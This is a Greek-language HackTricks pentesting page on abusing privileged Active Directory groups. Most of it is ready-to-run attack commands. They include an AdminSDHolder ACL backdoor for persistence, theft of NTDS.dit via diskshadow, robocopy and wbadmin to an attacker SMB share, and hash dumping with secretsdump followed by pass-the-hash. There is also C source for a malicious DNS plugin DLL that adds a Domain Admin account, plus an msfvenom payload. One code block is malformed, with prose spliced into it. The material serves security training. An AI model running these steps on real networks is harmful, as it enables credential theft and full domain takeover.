# Προνομιακές Ομάδες

{{#include ../../banners/hacktricks-training.md}}

## Γνωστές ομάδες με προνόμια διαχείρισης

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Αυτή η ομάδα έχει το δικαίωμα να δημιουργεί λογαριασμούς και ομάδες που δεν είναι administrators στο domain. Επιπλέον, της επιτρέπει τοπική σύνδεση στον Domain Controller (DC).

Για να εντοπιστούν τα μέλη αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Επιτρέπεται η προσθήκη νέων χρηστών, καθώς και local login στο DC.

## AdminSDHolder ομάδα

Ο Κατάλογος Ελέγχου Πρόσβασης (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμος, καθώς ορίζει δικαιώματα για όλες τις "προστατευμένες ομάδες" στο Active Directory, συμπεριλαμβανομένων ομάδων με υψηλά προνόμια. Αυτός ο μηχανισμός διασφαλίζει την ασφάλεια αυτών των ομάδων αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας επιτιθέμενος θα μπορούσε να το εκμεταλλευτεί τροποποιώντας το ACL της ομάδας **AdminSDHolder**, παραχωρώντας πλήρη δικαιώματα σε έναν τυπικό χρήστη. Αυτό θα έδινε ουσιαστικά σε αυτόν τον χρήστη πλήρη έλεγχο σε όλες τις προστατευμένες ομάδες. Εάν τα δικαιώματα αυτού του χρήστη αλλαχθούν ή αφαιρεθούν, θα αποκαθίστανται αυτόματα εντός μίας ώρας λόγω του σχεδιασμού του συστήματος.

Οι εντολές για την προβολή των μελών και την τροποποίηση των δικαιωμάτων περιλαμβάνουν:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Διατίθεται ένα script για να επιταχύνει τη διαδικασία επαναφοράς: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Η ιδιότητα μέλους σε αυτήν την ομάδα επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων του Active Directory, τα οποία μπορούν να αποκαλύψουν ευαίσθητες πληροφορίες:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Πρόσβαση στον DC

Η πρόσβαση σε αρχεία στον DC περιορίζεται εκτός αν ο χρήστης είναι μέλος της ομάδας `Server Operators`, που αλλάζει το επίπεδο πρόσβασης.

### Αναβάθμιση προνομίων

Χρησιμοποιώντας το `PsService` ή το `sc` από το Sysinternals, μπορεί κανείς να ελέγξει και να τροποποιήσει τα δικαιώματα υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο πάνω σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και την αναβάθμιση προνομίων:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας την τροποποίηση υπηρεσιών για απόκτηση αυξημένων προνομίων.

## Backup Operators

Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων `DC01` λόγω των προνομίων `SeBackup` και `SeRestore`. Αυτά τα προνόμια επιτρέπουν περιήγηση φακέλων, εμφάνιση περιεχομένων και δυνατότητα αντιγραφής αρχείων, ακόμη και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Απαιτείται η χρήση ειδικών scripts για αυτή τη διαδικασία.

Για να απαριθμήσετε τα μέλη της ομάδας, εκτελέστε:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

Για να αξιοποιηθούν αυτά τα προνόμια τοπικά, εφαρμόζονται τα ακόλουθα βήματα:

1. Εισαγωγή των απαραίτητων βιβλιοθηκών:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ενεργοποιήστε και επαληθεύστε `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Πρόσβαση και αντιγραφή αρχείων από περιορισμένους καταλόγους, για παράδειγμα:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Η άμεση πρόσβαση στο σύστημα αρχείων του Domain Controller επιτρέπει την κλοπή της βάσης δεδομένων `NTDS.dit`, η οποία περιέχει όλα τα NTLM hashes των χρηστών και των υπολογιστών του domain.

#### Χρήση diskshadow.exe

1. Δημιουργήστε ένα shadow copy του `C` drive:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Αντιγράψτε `NTDS.dit` από το shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Εναλλακτικά, χρησιμοποιήστε `robocopy` για αντιγραφή αρχείων:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Εξαγάγετε τα `SYSTEM` και `SAM` για ανάκτηση hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Ανάκτηση όλων των hashes από `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Μετά την εξαγωγή: Pass-the-Hash to DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Χρήση wbadmin.exe

1. Ρυθμίστε σύστημα αρχείων NTFS για SMB server στο attacker machine και cache τα SMB credentials στο target machine.
2. Χρησιμοποιήστε `wbadmin.exe` για backup του συστήματος και εξαγωγή του `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Για μια πρακτική επίδειξη, δείτε [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα δικαιώματά τους για να φορτώσουν μια αυθαίρετη DLL με προνόμια SYSTEM σε έναν DNS server, που συχνά φιλοξενείται σε Domain Controllers. Αυτή η δυνατότητα προσφέρει σημαντικό δυναμικό εκμετάλλευσης.

Για να εμφανίσετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Αυτή η ευπάθεια επιτρέπει την εκτέλεση αυθαίρετου κώδικα με προνόμια SYSTEM στην υπηρεσία DNS (συνήθως εντός των DCs). Το ζήτημα αυτό διορθώθηκε το 2021.

Τα μέλη μπορούν να αναγκάσουν τον διακομιστή DNS να φορτώσει μια αυθαίρετη DLL (είτε τοπικά είτε από ένα απομακρυσμένο share) χρησιμοποιώντας εντολές όπως:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Η επανεκκίνηση της υπηρεσίας DNS (η οποία μπορεί να απαιτεί επιπλέον δικαιώματα) είναι απαραίτητη για τη φόρτωση της DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Για περισσότερες λεπτομέρειες σχετικά με αυτό το διάνυσμα επίθεσης, ανατρέξτε στο ired.team.

#### Mimilib.dll

Είναι επίσης εφικτό να χρησιμοποιηθεί η mimilib.dll για εκτέλεση εντολών, τροποποιώντας την ώστε να εκτελεί συγκεκριμένες εντολές ή reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.

### WPAD Record for MitM

Οι DnsAdmins μπορούν να χειραγωγήσουν καταχωρήσεις DNS για να πραγματοποιήσουν επιθέσεις Man-in-the-Middle (MitM) δημιουργώντας μια καταχώρηση WPAD μετά την απενεργοποίηση της global query block list. Εργαλεία όπως Responder ή Inveigh μπορούν να χρησιμοποιηθούν για spoofing και καταγραφή της δικτυακής κίνησης.

### Event Log Readers
Τα μέλη μπορούν να έχουν πρόσβαση στα αρχεία καταγραφής συμβάντων, ενδεχομένως βρίσκοντας ευαίσθητες πληροφορίες όπως plaintext passwords ή λεπτομέρειες εκτέλεσης εντολών:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο domain object, ενδεχομένως χορηγώντας προνόμια DCSync. Τεχνικές για privilege escalation που εκμεταλλεύονται αυτή την ομάδα περιγράφονται στο Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Οι Hyper-V Administrators έχουν πλήρη πρόσβαση στο Hyper-V, το οποίο μπορεί να εκμεταλλευτεί κανείς για να αποκτήσει έλεγχο επί εικονικοποιημένους Domain Controllers. Αυτό περιλαμβάνει cloning live DCs και εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Παράδειγμα Εκμετάλλευσης

Το Firefox's Mozilla Maintenance Service μπορεί να εκμεταλλευτεί από Hyper-V Administrators για να εκτελέσουν εντολές ως SYSTEM. Αυτό περιλαμβάνει τη δημιουργία ενός hard link προς ένα προστατευμένο SYSTEM αρχείο και την αντικατάστασή του με ένα malicious executable:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Η εκμετάλλευση hard link έχει μετριαστεί σε πρόσφατες ενημερώσεις των Windows.

## Group Policy Creators Owners

Αυτή η ομάδα επιτρέπει στα μέλη να δημιουργούν Group Policies στον domain. Ωστόσο, τα μέλη της δεν μπορούν να εφαρμόσουν group policies σε χρήστες ή group ούτε να επεξεργαστούν υπάρχοντα GPOs.

## Organization Management

Σε περιβάλλοντα όπου έχει αναπτυχθεί **Microsoft Exchange**, μια ειδική ομάδα γνωστή ως **Organization Management** διαθέτει σημαντικές δυνατότητες. Αυτή η ομάδα έχει προνόμια για **πρόσβαση στα mailboxes όλων των domain users** και διατηρεί **πλήρη έλεγχο πάνω στην Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Ο έλεγχος αυτός περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να αξιοποιηθεί για privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Τα μέλη της ομάδας **Print Operators** έχουν αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, που τους επιτρέπει να **log on locally to a Domain Controller**, να τον τερματίσουν και να διαχειρίζονται εκτυπωτές. Για να αξιοποιηθούν αυτά τα προνόμια, ειδικά εάν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε μη ανεβασμένο context, είναι απαραίτητο να παρακαμφθεί το User Account Control (UAC).

Για να απαριθμηθούν τα μέλη αυτής της ομάδας, χρησιμοποιείται η ακόλουθη PowerShell εντολή:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Για πιο λεπτομερείς τεχνικές εκμετάλλευσης σχετικές με **`SeLoadDriverPrivilege`**, θα πρέπει να συμβουλευτείτε συγκεκριμένους πόρους ασφάλειας.

#### Χρήστες Απομακρυσμένης Επιφάνειας Εργασίας

Τα μέλη αυτής της ομάδας έχουν πρόσβαση σε υπολογιστές μέσω του Remote Desktop Protocol (RDP). Για να απαριθμήσετε αυτά τα μέλη, υπάρχουν διαθέσιμες εντολές PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Περαιτέρω πληροφορίες σχετικά με την εκμετάλλευση του RDP μπορούν να βρεθούν σε εξειδικευμένους πόρους pentesting.

#### Χρήστες Απομακρυσμένης Διαχείρισης

Τα μέλη μπορούν να έχουν πρόσβαση σε PCs μέσω **Windows Remote Management (WinRM)**. Η απαρίθμηση αυτών των μελών επιτυγχάνεται μέσω:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Για τεχνικές εκμετάλλευσης που σχετίζονται με **WinRM**, θα πρέπει να συμβουλευτείτε την αντίστοιχη τεκμηρίωση.

#### Χειριστές διακομιστών

Αυτή η ομάδα έχει δικαιώματα για τη διενέργεια διαφόρων ρυθμίσεων σε ελεγκτές τομέα (Domain Controllers), συμπεριλαμβανομένων δικαιωμάτων backup και restore, αλλαγής της ώρας του συστήματος και τερματισμού του συστήματος. Για να απαριθμήσετε τα μέλη, η εντολή που παρέχεται είναι:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Αναφορές <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
